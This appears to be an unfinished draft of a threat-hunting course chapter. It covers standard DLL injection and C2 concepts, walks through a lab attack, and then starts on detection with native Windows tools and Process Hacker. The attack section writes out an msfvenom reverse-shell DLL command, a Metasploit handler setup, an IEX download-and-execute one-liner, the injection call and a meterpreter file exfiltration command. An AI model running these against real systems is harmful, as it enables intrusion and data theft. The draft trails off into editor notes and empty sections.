So think of a DLL as a communal resource: let's say you have 4 programs running and they all want to use a common function - let's say for the sake of simplicity the ability to minimize the gui window. Now instead of each of those programs having their own personal copy of the function that allows that, they'll instead access a DLL that contains the function to minimize gui windows instead. So when you click on the minimize icon and that program needs the code to know how to behave, it does not get instructions from its own program code, rather it pulls it from the appropriate DLL with some help from the Windows API. 

Thus any program you run will constantly call on different DLLs to get access to a wide-variety of common (and often critical) functions and data.

# what is a classical DLL-injection?
So keeping what I just mentioned in mind - that any running program is accessing a variety of code from various DLLs at any time - what then is a DLL-injection attack? Well in a normal environment we have legit programs accessing code from legit DLLs. 

With a DLL-injection attack an attacker enters into the population of legitimate DLLs a malicious one, that is a DLL that contains the code the attacker wants executed. Once the malicious DLL is ready, the attacker then basically tricks a legitimate app into loading it into its memory space and then executing it. Thus a DLL injection is a way to get another program to run your code, instead of creating a program specifically to do so. 

Threat actors love injecting DLLs for two main reasons. First, injected code runs with the same privileges and the legitimate process - meaning potentially elevated. Second, doing so makes it, in general, much harder to detect. There's no longer an opportunity to find a "smoking gun" .exe file, rather to find anything malicious we need to peer beneath the processes at an arguably more convoluted level of abstraction. 

So that's DLL injection in a nutshell, but what then is *standard* DLL-injection? Well there are a few ways in which to achieve the process I described above, of which standard is one such way. What distinguishes it is that the malicious DLL is first written to the victim's disk before being loaded. This can quite obviously considered a design flaw that makes our lives as threat hunters easier since disk-based fingerprints are not ephemeral. 

As a side-note: the thus logical evolutionary improvement on standard DLL-injections are *reflective loading* DLL-injections. Instead of writing the malicious DLL to disk, they inject it directly into memory thereby increasing the volatility of any evidence. But hold that thought until our next course, where we'll be covering it.

{{< figure src="/img/hold.gif" title="" class="custom-figure" >}}

# What is a Command and Control (C2) Stager, Server, and Payload?

Let's start by sketching a scenario of how many typical attacks play out these days. An attacker sends a spear-phishing email to an employee at a company. The employee, perhaps tired and not paying full attention, opens the so-called *"urgent invoice"* attached to the email. 

{{< figure src="/img/drevil.gif" title="" class="custom-figure" >}}

Opening this attachment executes a tiny program called a `stager`. A stager, though not inherently malicious, "sets the stage" by performing a specific task: it reaches out to a designated address, often a web server owned by the hacker, to download + execute another piece of code.

This new code properly establishes the attacker's presence on the victim's system. It acts as a "gateway," allowing the attacker to execute commands on the victim's system from their own. And this system, the one they use to execute commands on that of the victim, is what we call the `C2 Server`. 

And finally the code the stager downloaded, allowing the C2 server to establish its control on the victim's system, is called a `payload`, though depending on the exact context as well as framework may be called an `implant` (a more generic term), or a `beacon`. The latter is reserved for the type of implants used by for example Cobalt Strike which do not maintain a continuous, persistent network connection (which can raise suspicion), but instead performs a high latency, asynchronous periodic "check in". 

# References

So though admittedly the previous sections is a somewhat shallow overview of these complex terms, I do think this does suffice for the purposes of moving ahead with the practical component of our course. However in case you wanted to understand it to a greater depth, here are my top picks for this topic:

[Keynote: Cobalt Strike Threat Hunting | Chad Tilbury](https://www.youtube.com/watch?v=borfuQGrB8g)

[In-memory Evasion - Detections | Raphael Mudge](https://www.youtube.com/watch?v=lz2ARbZ_5tE)

[Advanced Attack Detection | William Burgess +  Matt Wakins](https://www.youtube.com/watch?v=ihElrBBJQo8)


# ATTACK!

Finally! Let's get at it... 

{{< figure src="/img/attack_kip.gif" title="" class="custom-figure" >}}

1. First things first - fire up both your Windows 10 and Kali VMs.
2. On our Kali VM - open a terminal and run `ip a` so we can see what the ip address is. Write this down, we'll be using it a few times during the generation of our stager and handler. You can see mine below is **192.168.230.155** NOTE: Yours will be different!

{{< figure src="/img/image032.png" title="" class="custom-figure" >}}

3. Now go to the Windows VM. Open an administrative PowerShell terminal. Run `ipconfig` so we also have the ip of the victim - write this down. 

{{< figure src="/img/image033.png" title="" class="custom-figure" >}}

4. And now, though it's not really required, I just like to ping the Kali VM from this same terminal just to make sure the two VMs are connecting to one another on the local network. Obviously if this fails you will have to go back and troubleshoot.

{{< figure src="/img/image034.png" title="" class="custom-figure" >}}

5. Next we'll just create a simple text file on the desktop which will basically emulate the "nuclear codes" the threat actor is after. Right-click on the desktop, `New` > `Text document`, give it a name and add some generic content. 

{{< figure src="/img/image035.png" title="" class="custom-figure" >}}

6. Next we want to start capturing our packet capture using `WireShark`. In the search bar write `WireShark` and open it. Under `Capture` you will see the available interfaces, in my case the one we want is called `Ethernet0` - yours may or may not have the same name. How do you know which is the correct one? Look at the little graphs next to the names, only one should have little spikes representing actual network traffic, the rest are likely all flat. It's the active one, ie the one with traffic, we want - see image below. Once you've identified it, simply double-click on it, this then starts the recording. 

7. And now finally, right before we start our attack I also want to clear both logs we activated - Sysmon and PowerShell ScriptBlock. You see since we've enabled it, it's likely recorded a bunch of events completely irrelevant to our interest here. So we'll clear them and start a new so our final capture is undiluted. Open a PowerShell terminal as admin, and then run the following commands.
```
wevtutil cl "Microsoft-Windows-Sysmon/Operational”
```
```
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
```

{{< figure src="/img/image036.png" title="" class="custom-figure" >}}

Great now that everything is setup let's generate our stager and transfer it over to the victim. 
1. On our Kali VM open your terminal.
2. We are going to run the command below, which will generate a payload for us using `msfvenom` (a standalone app that is part of the Metasploit framework). Note the following:
- `Lhost` is the IP of the **listening** machine, ie the attacker. Yours will be different than mine here, adapt it!
- `Lport` is the port we will be listening on. This could be anything really, you can see in this case I chose an arbitraty port 88. You should be aware however that some victim systems may have strict rules regarding which outbound ports are allowed to be used, in these cases a standard port such as 80/443 would be a safer choice. Feel free to experiment/choose any port you'd like\
- `-f` designates the file type, which of course is DLL in this case.
- `>` indicates where we wish to save it, as well as the name we are giving to it, you can see I am saving it on my desktop as `evil.dll` - very subtle!

```
sudo msfvenom -p windows/meterpreter/reverse_tcp Lhost=192.168.230.155 Lport=88 -f dll > /home/hacker/Desktop/evil.dll
```

{{< figure src="/img/image037.png" title="" class="custom-figure" >}}

3. Next we want to tranfer our malicious DLL over to the victim. There are a myriad ways in which you can achieve this, so feel free to follow my example, or use any other technique you prefer. Still on our Kali VM navigate to the directory where you saved your payload, in my case this is on the desktop. We'll now create a very simply http server by running a single python command (see below). Again `8008` represents an arbitrary port, feel free to choose something else

```
python3 -m http.server 8008
```

{{< figure src="/img/image038.png" title="" class="custom-figure" >}}

4. Now we'll head over to the victim's system, we can either run a powershell command to download the file, or very simply open the browser (Edge) and type in the address bar write `http://[IP of hacker]:[port of http server]`, for example:

{{< figure src="/img/image039.png" title="" class="custom-figure" >}}

5. As you can see in the image above, you should see the dll file. If you don't, you either did not generate it, OR most likely you are not running the http server from the same directory. Now simply right-click on the DLL, `Save link as`, and in my case I will save it to desktop. Note that Edge may block the download, for example: 

{{< figure src="/img/image040.png" title="" class="custom-figure" >}}

If this is the case, click on the three dots `...` to the right of this message (More actions), and select `Keep`. You'll be confronted with another warning, select `Show more`, then `Keep anyway`. That should have finally done the trick!

{{< figure src="/img/image042.png" title="" class="custom-figure" >}}

Ok, we now have our malicious DLL on the victim's disk. 

6. So as we shared in the theory section of this course, this initial stager does one thing (at least on main thing): it calls back to the attacking machine to establish a connection and put in motion the subsequent series of events. But we can't run it just yet since we need something on our attacking machine that is actually listening and awaiting that call, ie the handler. So let's head over to our Kali VM, and in the terminal we'll run the following commands:
- `msfconsole`: this will open our metasploit console. 
- ` use exploit/multi/handler`: this sets up a generic payload handler inside the Metasploit framework. The `multi` in the command denotes that this is a handler that can be used with any exploit module, as it is not specific to any particular exploit or target system. The `handler` part of the command tells Metasploit to wait for incoming connections from payloads. Once the exploit is executed on the target system, the payload will create a connection back to the handler which is waiting for the incoming connection.
- `set payload windows/meterpreter/reverse_tcp`:  tells Metasploit what payload to use in conjunction with the previously selected exploit. The payload is the code that will be executed on the target system after a successful exploit. `windows`: This tells the framework that the target system is running Windows. `meterpreter`: Meterpreter is a sophisticated payload that provides an environment for controlling, manipulating, and navigating the target machine. `reverse_tcp`: This creates a reverse TCP connection from the target system back to the attacker's system. When the payload is executed on the target system, it will initiate a TCP connection back to the attacker’s machine (where Metasploit is running).

{{< figure src="/img/image043.png" title="" class="custom-figure" >}}

7. We now need to set required parameters, to see which ones are required run `show options`.

{{< figure src="/img/image044.png" title="" class="custom-figure" >}}

We can see there are 3 required parameters. The first one `EXITFUNC` is good as is. Meaning we need only to provide values for `LHOST` and `LPORT`, which is the exact same value we provided when we generated our `msfvenom` stager in step 2 - ie the attacker IP, as well as the port we chose (**88**).

8. We can now set these values with two commands:
- `set LHOST 192.168.230.155` (Note: change IP to YOURS)
- `set LPORT 88`

{{< figure src="/img/image045.png" title="" class="custom-figure" >}}

9. Now to start the listener we can use one of two commands, there's literally no difference. You can either use `run`, or `exploit`. 

{{< figure src="/img/image046.png" title="" class="custom-figure" >}}

So now that we have our handler listening for a callback we can go back to our Windows VM to run the code. 

**Performing the standard DLL-injection**

Next we need to perform a bit of Macgyvering...

{{< figure src="/img/macgyver.gif" title="" class="custom-figure" >}}

Here's the thing - to perform the injection we need another script which will get an actual process to inject `evil.dll` into its memory space. By far the most common and effective script to perform this is called [`Invoke-DllInjection.ps1`.](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-DllInjection.ps1)

Usually in order to run this next attack we'll use a PowerShell command to download the script [directly from the original github repo](https://github.com/PowerShellMafia/PowerSploit) and inject it directly into memory. The unfortunate thing is that this incredible artifact has not been updated in a few years, and since it's also been archived it's unlikely it ever will. 

The code as it currently stands on the original repo is however broken, at least when I tried it (in multiple configurations). The good news though is I found a simple fix and have updated the script which is now being hosted on [my github repo here](https://raw.githubusercontent.com/faanross/threat.hunting.course.01.resources/main/Invoke-DllInjection-V2.ps1).

And thus, just so you are aware, we are going to download and inject into memory the script from my personal Github repo but **in no way whatsoever do I want to appear as taking any credit/ownership for it**. The original link, as well as a reference to where I found the fix, can be found in the opening comments in the script itself, feel free to refer to them if you want. 

1. Back on our Windows VM we'll open an administrative PowerShell terminal - a reminder that in order to do so you have to right-click on PowerShell and select `Run as Administrator`. 

{{< figure src="/img/image047.png" title="" class="custom-figure" >}}

2. Now we'll run the following command, as mentioned before: it's going to download a script hosted on a webserver and then inject it directly into memory. This is a good example of what living off the land is all about - utilizing everyday components while not leaving any residue on the hard drive. 

```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/faanross/threat.hunting.course.01.resources/main/Invoke-DllInjection-V2.ps1')
```

Note that after you run it there won't be any feedback/output. In case you did not know this is almost universally true: when it comes to PowerShell, not receiving any feedback/output almost always means the command ran succesfully. If there was an error, you'll get some red text telling you what went wrong. 

Great so the script that will inject `evil.dll` into a process memory space is now in memory. But to be clear: though we've injected that script into memory, but we've not yet executed it. We're about to do so, but before that there's one thing we need. Remeber in the beginning when I explained about how dll-injections work I said that we basically "trick" a legit process into running code from a malicious DLL. So this script is what's going to be doing the trickery, we of course have our malicious DLL which we transferred over, so taht means we only need a legit process.

Now it used to be the case that you could easily inject into any process, including native Windows processes like notepad and calculator. You'll notice if you do some older tutorials, they'll almost always choose one of these two as the example. However, though there are potential workarounds, this has become more ciomplicated since Windows 10 - if you're curious to know why [see here.](https://security.stackexchange.com/questions/197409/why-doesnt-dll-injection-works-on-windows-10-for-native-windows-binaries-e-g)

So as to not overcomplicate things, and because it's not really all that unrealistic to expect a non-native Windows executable to be running on a victim's system, I'll be running a portable executable called rufus.exe. It's a very small, simple program that creates bootable usb drives, but that's irrelevant we just need some process. If you really wanted to run the same thing you can [get it here](https://rufus.ie/en/), otherwise feel free to run any other program as longs as its not a native Windows one. 

3. So we will run `rufus.exe`. But since we'll need to pass its Process ID (PID) to the script as an argument, we just need to find that real quick. You can either run Task Manager from the gui, or here I'll be running `ps` in PowerShell. And we can see here the PID is 784.

{{< figure src="/img/image048.png" title="" class="custom-figure" >}}

4. And now all the pieces are in place so we can run the actual command below. We can note that we provide it two things, first the PID of the legit process we want to inject into, and the path to the DLL we want to be injected. So run the command in the same administrative PowerShell terminal. 

```
Invoke-DllInjection -ProcessID 784 -Dll C:\Users\User\Desktop\evil.dll
```

{{< figure src="/img/image049.png" title="" class="custom-figure" >}}

5. We see some output, now to know if it worked let's head on back to our Kali VM. We can immediately see that we received the connection and are now in a `meterpreter` shell - success!

{{< figure src="/img/popped_shell.gif" title="" class="custom-figure" >}}

{{< figure src="/img/image050.png" title="" class="custom-figure" >}}

6. We can run a few commands if we'd like, also we'll exfiltrate the "nuclear launch codes" we created in the beginning. 

```
download C:\\Users\\user\\Desktop\\top_seekrit.txt /home/hacker/Desktop/
```
{{< figure src="/img/image051.png" title="" class="custom-figure" >}}

Additionally, we can also drop into a `shell`.

{{< figure src="/img/image052.png" title="" class="custom-figure" >}}

That's it for our attack!

# Artifact Collection

One final thing before we move one: lets concretize all our forensic artifacts.

First we'll export our Sysmon log, run the following command in an administrative PowerShell terminal:
```
wevtutil epl "Microsoft-Windows-Sysmon/Operational" "C:\Users\User\Desktop\SysmonLog.evtx”
```

Stay in the same administrative PowerShell terminal so we can also export our PowerShell ScriptBlock logs:
```
wevtutil epl "Microsoft-Windows-PowerShell/Operational" "C:\Users\User\Desktop\PowerShellScriptBlockLog.evtx" "/q:*[System[(EventID=4104)]]"
```

Now let's stop our packet capture: 
1. Open WireShark.
2. Press the red STOP button.
3. Save the file, in my case I will save it to desktop as `dllattack.pcap`.

And finally we'll dump the memory for our post-mortem analysis:
1. Open a `Command Prompt` as administrator. 
2. Navigate to the directory where you saved `winpmem`, in my case it's on the desktop.
3. We'll run the following command, meaning it will dump the memory and save it as `memdump.raw` in our present directory

```
winpmem.exe memdump.raw
```

Awesome. We're ready to move on to our analysis, however I wanna take a kinda "detour" chapter next to grant us a bit of perspective. If it sounds a bit befuddling now, please venture forth - soon it will make sense. 

{{< figure src="/img/confused_dude.gif" title="" class="custom-figure" >}}

***

# Shenanigans! A (honest) review of our attack

OK so let's just hold back for a second. At this point, if you have your wits about you, you might, and rightfully I'll add, be calling **shenanigans** on me. 

{{< figure src="/img/shenanigans.gif" title="" class="custom-figure" >}}

"Wait", I hear you say, "if the whole point of infecting the victim and getting C2 control established is so that we can run commands on it, isn't it cheating then to be running these commands ahead of that actually happening"? Look at the meta: the whole point of establishing C2 on the victim is so we can run commands on it, but we literally just allowed ourselves to freely run commands on the victim so that we can establish C2. We wrote our malicious DLL to disk, injected our DLL-injection script into memory, and ran the script all from the comfort of Imaginationaland.

{{< figure src="/img/imagination.gif" title="" class="custom-figure" >}}

So then the answer is yes. That was cheating - of course. But, it's cheating with a purpose you see, the purpose here being that this is a course on threat hunting and not on initial compromise. So we stripped the actions of the initial compromise down to its core and for now we've foregone our spearfishing email and VBA macro. We've streamlined the essence of the attack - we're expending less energy in the effort, and yet for our intents have created the same outcome. If you wanted a more realistic approximation of the initial compromise + other elements of Red Teaming - [here's a good free resource to get you going](https://www.youtube.com/watch?v=EIHLXWnK1Dw&list=PLBf0hzazHTGMjSlPmJ73Cydh9vCqxukCu)
 

So, we won't be investing our time in completely recreating a realistic simulation of the intial compromise, HOWEVER, I do think it's very important for us to discuss here what it would look like. We are about to embark on a Threat Hunt, which is an investigation; but there would be no value for us to go attempting to discover things that exists only because of our specific "cheating" method here. Meaning: I want to make sure you understand which parts of the attack we just performed are representative of an actual acttack, and which are not. The reason for this of course is so we can focus on what really matters - ie that which we expect to see following a real-life attack. 

So the remainder of this section will be dedicated to that. I'm very briefly going to review all the main beats to the attack we just performed, thereafter I'll "translate" the actions to their real-world counterpart, pointing out specifically which elements we expect to see in an actual attack, and which we don't. 

Here's what we just did in our attack:
1. We crafted a malicious DLL on our system.
2. We transferred this DLL over to the victim's system.
3. We opened a meterpreter handler on our system.
4. We then downloaded a powershell script from a web server, and injected it into the victim's memory.
5. We opened a legitimate program (rufus.exe).
6. We then ran the script we downloaded in #4, causing the malicious dll from #1/2 to be injected into the memory space of #5.
7. The injected DLL is executed, calling back to the handler we created in #3, thereby establishing our backdoor connection.
8. We exfiltrated some data using our meterpreter shell.
9. We used our meterpreter shell to spawn a command prompt shell.
10. We ran a simple command in the new shell (whoami).

OK. Now let's review what an actual attack might have looked like, how these same steps and outcomes would more accurately be represented:
1. An attacker does some recon/OSINT, discovering info that allows them to craft a very personalized email to a company's head of sales as part of a spearphishing campaign.
2. The attacker included in this email a word document labelled "urgent invoice", and by using some masterful social engineering techniques they convince the head of sales to immediately open the document to pay it.
3. With macros enabled, once the head of sales opens the invoice it runs an embedded VBA macro, which contains the adversary's malicious code. 
4. This code can do many, and even all, of the things we did manually:
    - It can download the malicious DLL.
    - It can inject the script responsible for performing the attack into memory.
    - It can also run the actual script.
5. Note however that the script does not neccessarily do everything as we described above. It might only go and download instructions, which then allow it to perform subsequent steps. There exists here, as in so many areas of cybersecurity, strategic trade-offs. If the initial VBA macro contains all the instructions that's great since it now has less work to do downloading further instructions. Thus risk is minimized from an activity POV (less steps), however it also means the file will be relatively larger, which can increase the risk of being detected (more noticeable). All to say: both approaches are feasible and have been observed in real attacks, it really depends on the overall risk-mitigation strategy selected by the adversary. 
6. In our simulation we chose a program (rufus.exe) and even opened it ourselves. In an actual attack this highly improbable since it represents unnecessary risk. Rather, the attacker would select a process that is already running to inject into, which could even lead to elevated privileges. Other considerations would also be selecting processes that are less likely to be terminated or restarted. Common targets might include svchost.exe, explorer.exe, or other system processes.

So that's basically it - I hope this helps you understand how our attack lead to the same outcomes, but just followed another path to get there in the interest of efficiency.

There is one final thing I want to address, another thing that, if you're paying attention you might be wondering why exactly did we do this? If you take a moment to think about it, the initial VBA macro might as well simply just called back to the handler to establish a connection directly. This would have bypassed numerous steps (download + save dll, download + inject script, invoke script), each which represent a potential point of failure or detection. So why go through all this extra effort to get to the same result - a backdoor connection?

{{< figure src="/img/satan.gif" title="" class="custom-figure" >}}

The reason to go through these steps rather than just having the initial script call back to the handler is all about stealth. Yes our process might involve increased risk, but the end result is a connection mediated by an injected DLL and not an executable, which in general will be harder to detect. So again, this game is all about trade-offs: this process accepts a relatively higher degree of risk during the process of establishing itself on the victim's system, however once established it operates with a relatively lower degree of risk. 

Ok friends, thanks for entertaining this little side quest. I do so consciously with the full intent of ensuring you understand the why as much as the how. For now however let's move onto the first phase of our actual threat hunt - live analysis using native windows tools.

***

# LIVE ANALYSIS: NATIVE WINDOWS TOOLS
# Introduction
So our first analysis will be a quick review using standard (native) Windows tools. These tools are a quick and dirty means to get a finger on the pulse, meaning they'll give us a broad overview of some important indicators while at the same time being limited in the depth of information.

So if we have at our disposal better tools, ie tools that can provide more information, why bother? I'm of the belief (inspired by one the greats, [John Strand](https://twitter.com/strandjs)), that even if there are better tools availalbe you should *also* be able to do a basic analysis with the native Windows tools. 

Tools may change, they come and go, or, you might land in a situation where they are, for whatever reason, unavailable. Knowing how to get a basic read with Windows tools in any situation covers your bases. Think of it as learning how to survive in the outdoors - yes you can always make a fire using a lighter, but there's a good reason to also learn how to make it, however cumbersome, with what's freely available - it might just save your butt in case your lighter fails. 

{{< figure src="/img/survivorman2.gif" title="" class="custom-figure" >}}

# Theory
You will benefit from understanding the [following short theoretical framework on the '3 Modes of Threat Hunting'](https://www.faanross.com/posts/three_modes/). I leave the decision of whether or not to read it up to you, though it will be referenced throughout the remainder of the course. 

# Performing the Analysis
There are a number of things we can look at when we do a live analyis using the native tools, including: connections, processes, shares, firewall settings, services, accounts, groups, registry keys, scheduled tasks etc.

For this course we will only focus on connections and processes. If you are keen to learn more about how to investigate the other factors I suggest you view [this excellent talk by John Strand](https://www.youtube.com/watch?v=fEip9gl2MTA). A reminder that at this point we are in Threat Hunting Mode 1 - we presume compromise, but have not yet unearthed any confirmation thereof.

# Connections
Let's run `netstat`, which will display active network connections and listening ports. After all, most malware serves merely as a way for the adversary to ultimately have a connection to the victim's machine to run commands and exfiltrate data.

So open a PowerShell admin terminal on our Windows 10 system and run the following command:
```
netstat -naob
```
Note in particular the inclusion of `o` and `b` in our command which will also show the PID, as well as name of executable, involved in each connection.

In the results we can immediately see a variety of connections, as well as ports our system is listening on. Let's especially pay attention to `ESTABLISHED` connections.

And we can scroll through the list and then as threat hunters something unusual should stick out to us:

{{< figure src="/img/image071.png" title="" class="custom-figure" >}}

What exactly is unusual about this? Well even though `rundll32.exe` is a completely legitimate Windows process, it's used to load DLLs. The question then beckons: why exactly is it involved in an outbound connection?

In this case we can see it's connected to another system on our local network, but remember that's only because of our VLAN setup. In an actual attack scenario this would not be the case, meaning we see `rundll32.exe`, a process not known to be involved in creating network connections, now indeed being responsible for establishing a connection to a system outside of our network. 

In a typical scenario we'd immediately want to know more about this IP. Is it known? Is there a business use case associated with it? Are other systems on the network also connecting to it? Because if the answer to all those questions are no - well then we definitely have something strange on our hands.

So let's use our native Windows tools to learn more about this process. To do so however let's just take note of our PID, as can be seen in the image above mine is `3948`, yours will be different. 

# Processes

We want to know more about this process, however we specifically want to know: what command-line options were used to run it, what is it's parent process, and what DLLs are being used by the process.

Let's have a look at the DLLs, staying in our PowerShell terminal we run:
```
tasklist /m /fi "pid eq 3948"
```
{{< figure src="/img/image072.png" title="" class="custom-figure" >}}

On quick glance nothing seems unusual about this output - no DLL sticks out as being out of placed for `rundll32.exe`. So for now let's move on with the knowledge that we can always circle back and dig deeper if need be. 

Next let's have a look at the Parent Process ID (PPID):
```
wmic process where processid=3948 get parentprocessid
```
{{< figure src="/img/image073.png" title="" class="custom-figure" >}}

Great, we can see the PPID is `6944`, now let's figure out the name of the process it belongs to:
```
wmic process where processid=6944 get Name
```
{{< figure src="/img/image074.png" title="" class="custom-figure" >}}

We see thus that the name of the Parent Process, that is the name of the process that spawned `rundll32.exe` is `rufus` - a program used to create bootable thumb drives. 

Now this, on quick glance seems unusual - why is this app needing to call `rundll32.exe`? However, since we're not an expert on this program's design, this could potentially be part of its normal operation - we'd have to jump in deeper to understand that.

However, let's keep the bigger picture in mind again - we came upon `rundll32.exe` because it created a network connection to an external IP. So in that sense, yes this is very weird - why is a program used to create bootable thumb drives spawning `rundll32.exe` which then creates a network connection? Very sus.

One final thing here using our native tools, let's have a look at the command-line arguments:
```
wmic process where processid=3948 get commandline
```
{{< figure src="/img/image075.png" title="" class="custom-figure" >}}

We can see the command is nude - no arguments are provided. Well, since again the `rundll32.exe` command is typically used to execute a function in a specific DLL file, you would expect to see it accompanied by arguments specifying the DLL file and function it's supposed to execute. But here it's simply executed by itself, again reinforcing our suspicion that something is amiss. 

# Closing Thoughts
Again we started with an open mind, spotten an unusual process being involved in a network connection, and then using other native Windows tools learned more about this process. And the more we learned, the more our suspicion was confirmed. We can thus, in reference to the Three Modes of Threat Hunting, confidently say we're now in the second mode - building our case. Let's continue exploring in the realm of processes by digging deeper with `Process Hacker`.

***

# 6. Live Forensics: Process Hacker 2
# Introduction
I explained, hopefully in a somewhat convincing manner, why it's good practice for us to learn how to use the native Windows tools to get an initial, high-level read. But of course these tools are also limited in what information they can provide.

So now let's bring out the big guns and learn all we can.

{{< figure src="/img/guns.gif" title="" class="custom-figure" >}}

But alas, as these things go, it really behooves us to learn a bit of theory behind what we're going to look at with the intention of understanding why it is we are looking at these things, and what exactly what we will be looking for. 

Indeed, in matters like these, it is beneficial for us to delve into some theory. This will help us better comprehend what we're about to examine. We aim to understand why we are scrutinizing these things. Furthermore, it's essential to clarify exactly what we will be searching for.

# Theory

***"A traditional anti-virus product might look at my payload when I touch disk or load content in a browser. If I defeat that, I win. Now, the battleground is the functions we use to get our payloads into memory. -Raphael Mudge"***

There are a few key properties we want to be on the lookout for when doing live memory analysis with something like `Process Hacker`. BuT, it's very important to know that there are **NO silver bullets**. There are no hard and fast rules where if we see any of the following we can be 100% sure we're dealing with malware. After all, if we could codify the rule there would be no need for us as threat hunters to do it ourselves - it would be trivial to simply write a program that does it automatically for us.

Again we're building a case, and each additionarl piece of evidence serves to decrease the probability of a false positive. We keep this process up until our self-defined threshold has been reached and we're ready to push the big red button. 

Additionally, the process as outline here may give the impression that it typically plays out as a strictly linear process. This is not necessarilly the case - instead of going through our list 1-7 below, we could jump around not only on the list itself, but with other techniqes completely. As a casual example - if we find a suspicious process by following this procedure, we might want to pause and 

have the SOC create a rule to scan the rest of the network looking for the same process. If we for example use **Least Frequency Analysis** and we see the process only occurs on one or two anomalous systems, well that then not only provides supporting evidence, but also gives us the confirmation that we are on the right path and should continue with our live memory analysis. 

Here's a quick overview of our list:
1. Parent-Child Relationships
2. Signature - is it valid + who signed?
3. Current directory
4. Command-line arguments 
5. Thread Start Address
6. Memory Permissions
7. Memory Content

Let's touch on each a little more:
1. ***Parent-Child Relationships***
As we know there exists a tree-like relationship between processes in Windows, meaning an existing process (`Parent`), typically spawn other processes (`Child`). And since in the current age of Living off the Land malware the processes themselves are not inherently suspiocus - after all they are legit processes commonly used by the system - we are more interested in the relationship with Parent and Child. We should always ask: *what spawned what*?

Because often we'll find a parent process that is not suspicious by itself at all, and equally a child process that we'd expect to see running. But the fact that this specific parent spawned that specific child - we'll that's sometimes off. A great example

Another thing is certain Parent-Child relatipnship will not only inicate that something is suspicious, but also act as a sort of signature implicating the potential malware involved. For example a classical Cobalt Strike Process Tree might look like this:

{{< figure src="/img/image076.png" title="" class="custom-figure" >}}

At the top we can see WMI spawning PowerShell - that itself is pretty uncommon, but used by a variety of malware software. But there's more - PowerShell spawning PowerShell. Again, not a smoking gun but unusual, and something seen with Cobalt Strike. But really the most idiosyncratic property here is the multiple instances of rundll32.exe being spawned. This is a classical Cobalt Strike strategy in action - the use of so-called sacrificial process. Plus the fact that it's rundll32.exe in particular - this is the default setting for Cobalt Strike. It might surprise you but *in situ* it's estimated that about 50% of adversaries never bother changing the default. Which makes one wonder - are they lazy, or are we so bad at detecting even default settings that they don't see the point in even bothering?

All this to say - we'll look for unusual Parent-Child Relationships, and we'll do so typically by looking at a `Process Tree` which shows as all processes and their associated relationships. In the discussion above I might have given the impression that these relationships all exist in pairs with a unidirectional relationship. Not so, just as in actual family trees a parent can spawn multiple children, and each of these can in turn spawn multiple children etc. So depending on the exact direction of the relationship, a process may be a parent or a child. 

2. ***Signature - is it valid + who signed?***
This is definitely one of the lowest value indicators - something that's nice to help build a case, but by itself, owing to so many potential exceptions, is quite useless. Nevertheless if we see that a process is unsigned, or signed by an untrusted source, we may layer it onto our case. 

3. ***Current directory***
There are a number of things we can look for here. For example we might see a process run from a directory we would not expect - instead of `svchost.exe` running from `C:\Windows\System32`, it ran from `C:\Temp` - uh-oh. 

Or, perhaps we see powershell, but it's running from `c:\windows\syswow64\...`, which by itself is a completely legitimate directory. But what's it purpose? Well, this basically means it's 32-bit code that was run. Now 32-bit systems still exist, but the vast majority of systems now are 64-bit. Malware however, still loves to use 32-bit code since it gives it the biggest reach - it can now infect both 32-bit and 64-bit systems. 

So if we saw PowerShell running from that directory, it's an artifact produced when 32-bit code is run, which requires 32-bit PowerShell. Using this on a modern, 64-bit system is pretty unusual.

All this to say: the directory can potentially tell us something about the legitimacy of the process

4. ***Command-line arguments***
We already saw this in the previous section - for example though running `rundll32.exe` is completely legit, we would expect it to have arguments referencing the exact functions and libraries it's supposed to load. Seeing it nude, well that's strange. Same goes for many other processes - we need thus to understand their function and how they are invoked to be able to determine the legitimacy of the process. 

Note that 1-4 above are not unique to dll-injections, but can be seen in malware in general. Our final 3 indicators we expect however only to see in relation to dll-injections. 

5. ***Thread Start Address***

We would expect to see this with a dll that was injected directly into memory without ever touching disk. Since an injected DLL is not memory-mapped the thread will not display an actual start address, instead it will show only `0x0` - see image below.

{{< figure src="/img/image077.png" title="" class="custom-figure" >}}


6. ***Memory Permissions***
One of the most common, well-known heuristics for injected malware is any memory region with RWX permissions. Memory with `RWX` permissions means that code can be written into that region and then subsequently executed. This is a capability that malware often utilizes, as it allows the malware to inject malicious code into a running program and then execute that code. The *vast* majority of legitimate software will not behave in this manner.

But be forewarned - RWX permissions are the tip of the iceberg in this game of looking for anomalies in memory permissions.It’s not the only one but many people stay stuck on it as if it’s the be all and end all.

Modern malware authors, knowing `RWX` not only sticks out like a thumb but can easily be prevented using a Write XOR Execute security policy, will have an initial pair of permissions (`RW`), and will then afterwards change permissions to `RX`. 

For now however we will focus only on `RWX`, but of course as we advance we will be looking at `odd pairs` in the future. 


7. ***Memory Content***
Once we find a memory space with unusual permissions we then also want to check its content for signs of a PE file. Let's have a brief overview of the PE file structure below:

{{< figure src="/img/image078.png" title="" class="custom-figure" >}}

We can see two things that always stick out: the magic bytes and a vestigial string associated with the `DOS Stub`. Magic bytes are predefined unique values used at the beginning of a file that are used to identify the file format or protocol. For a PE file, we would expect to see the ASCII character `MZ`, or `4D 5A` in hex. 

Then the string `This program cannot be run in DOS mode` is an artifact from an era that some systems only ran DOS. However the string is still kept there for mainly historical reasons. For us in this case however it's a useful thumbprint, informing us we're dealing with a PE file. 

Further, in the remainder of the payload we might be able to find some strings that are associated with specific malware. For example in the image below we can see Yara rules (authored by [Florian Roth]())


TK XXX CONTINUE EHRE







 that's still included

{{< figure src="/img/image079.png" title="" class="custom-figure" >}}

PE Header stomping

Other strings serve as signatures. 



**Parent-Child relationships**


OK FINISH THIS LATER NOW UIT IS RUNNING SO LET'S RUN THROUGH HERE

Note: have to review Eric Conrad and Chad Tilbury to beef out the first few





# Performing the Analysis
# Closing Thoughts

















































And while this connection is still going we'll jump right into live memory analysis. Ok so just so we don't end up just learning a bunch of "arbitraty" diagnostic properties to look out for we have to go on a brief side quest to gather some Theory Berries of Enhanced Insight that has the property of helping our party gain greater insight into what we should be looking for, and more importantly - why.

***

RIGHT AFTER ATTACK WE DO THE "REVIEW"


NOTE WE ALSO WANT TO INCLUDE THE ANALYSIS WITH STANDARD WINDOWS TOOLS A LA JOHN STRAND STYLE TO SEE WHAT WE CAN LEARN







# SIDE QUEST: The theoretical berries of C2 beacon live reading
# No this is just the theory section for our Live: Process Hacker section

{{< figure src="/img/quest02.gif" title="" class="custom-figure" >}}




***

